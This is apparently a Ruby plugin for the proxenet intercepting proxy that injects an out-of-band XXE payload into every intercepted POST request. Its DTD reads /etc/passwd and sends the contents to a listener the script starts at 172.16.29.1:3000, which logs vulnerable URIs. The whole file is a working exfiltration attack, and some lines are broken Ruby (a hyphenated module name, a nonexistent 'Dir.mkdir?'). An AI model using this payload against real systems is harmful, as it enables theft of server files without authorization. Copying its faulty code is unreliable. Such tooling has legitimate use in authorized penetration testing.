require 'rubygems'
require 'uri'

# gem install http_parser.rb
require 'http/parser'
# gem install unirest
require 'unirest'

$ipaddr       =   "172.16.29.1" # get_default_ipv4_addr()
$port         = 3000
$dir          = "/tmp/proxenet-xxe-payload"
$dtd_file     = "pwn.dtd"
$dtd_data     = '<!ENTITY % p1 SYSTEM "file:///etc/passwd">'         + "\n" +
                '<!ENTITY % p2 "<!ENTITY e1 SYSTEM ' + "'"           + "\n" +
                'http://'+ $ipaddr + ':' + $port.to_s + '/BLAH?%p1;' + "'>\">\n" +
                '%p2;'                                               + "\n"

class String

  def base64_encode()
    [ self ].pack("m*")
  end

end

def setup_xxe_env()
  p = `ps aux | grep -v grep | grep 'ruby -rwebrick -e'`
  if p.nil? or p == ""

    Dir.mkdir? $dir unless Dir.exist? $dir

    f = File.open($dir + "/" + $dtd_file,  'w')
    f.write("")

    pid = Process.fork
    if pid.nil? then
      exec "ruby -rwebrick -e\"include WEBrick

      callback = Proc.new do |req, res|
        unless req.nil?
          puts req.unparsed_uri[1..-1].unpack('m*')[0] + ' is vulnerable to XXE'
        end
      end

      s = HTTPServer.new(:BindAddress  => '#{$ipaddr}',
                         :Port         => '#{$port}',
                         :DocumentRoot => '#{$dir}',
                         :AccessLog => [],
                         :Logger => WEBrick::Log::new('/dev/null', 7),
                         :RequestCallback => callback)
      trap('INT'){ s.shutdown }
      s.start\""
    else
      Process.detach(pid)
    end


  end
end

setup_xxe_env()


module XXE-Reverse-Connect

  $PLUGIN_NAME = "XXE-Reverse-Connect"
  $AUTHOR = "thorgul"

  def proxenet_request_hook(request_id, request, uri)
    puts "XXE ReverseConnect"
    return request unless request.start_with? "POST"

    xml_payload  = '<?xml version="1.0"?>'         + "\n" +
                   '<!DOCTYPE foo SYSTEM "http://' +
                   $ipaddr + ':'                   +
                   $port.to_s + '/'                +
                   uri.base64_encode.strip + '">'  + "\n" +
                   '<foo>&e1;</foo>'

    parser = Http::Parser.new
    parser << request

    headers = parser.headers.dup
    headers['Content-Length'] = xml_payload.length
    headers['Content-Type']   = "text/xml"

    begin
      Unirest.post(uri,
                   headers: headers,
                   parameters: xml_payload)
    rescue RuntimeError => e
    end

    return request
  end

  def proxenet_response_hook(response_id, response, uri)
    return response
  end
end

if __FILE__ == $0
  proxenet_request_hook(ARGV[0], ARGV[1], ARGV[2])
end
